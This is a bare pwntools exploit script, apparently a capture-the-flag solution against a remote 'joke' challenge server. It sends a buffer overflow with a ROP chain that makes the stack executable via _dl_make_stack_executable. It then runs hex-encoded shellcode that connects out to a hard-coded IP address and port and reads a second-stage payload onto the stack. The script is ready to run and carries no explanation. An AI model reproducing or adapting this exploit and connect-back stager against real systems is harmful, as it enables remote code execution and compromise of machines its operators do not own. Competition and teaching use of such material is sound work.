from pwn import *

__stack_prot =              0x6C8FE0
__libc_stack_end =          0x6C8F90
poprax	 =           		0x418582 #pop rax ; mov dword ptr [rdi + 4], eax ; ret
_dl_make_stack_executable = 0x474630
call_esp =                  0x400b9c
poprdi = 					0x401476

# r = process('./joke')
# gdb.attach(r, "b*0x400b9c")
r = remote('bak.joke.grandprix.whitehatvn.com', 10205)

payload = "a"*0x18
payload += p64(poprdi)
payload += p64(__stack_prot-4)
payload += p64(poprax)
payload += p64(7)
payload += p64(poprdi)
payload += p64(__libc_stack_end)
payload += p64(_dl_make_stack_executable)
payload += p64(call_esp)
payload += "\x31\xF6\xF7\xE6\xFF\xC6\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x50\x5F\x52\x52\xC7\x44\x24\x04\x67\x5A\xE2\x9D\x66\xC7\x44\x24\x02\xD9\x03\x66\xC7\x04\x24\x02\x00\x54\x5E\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x54\x5E\x68\xFF\xFF\x00\x00\x5A\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05"
log.info("len: %s" %hex(len(payload)))
r.send(payload)
r.interactive()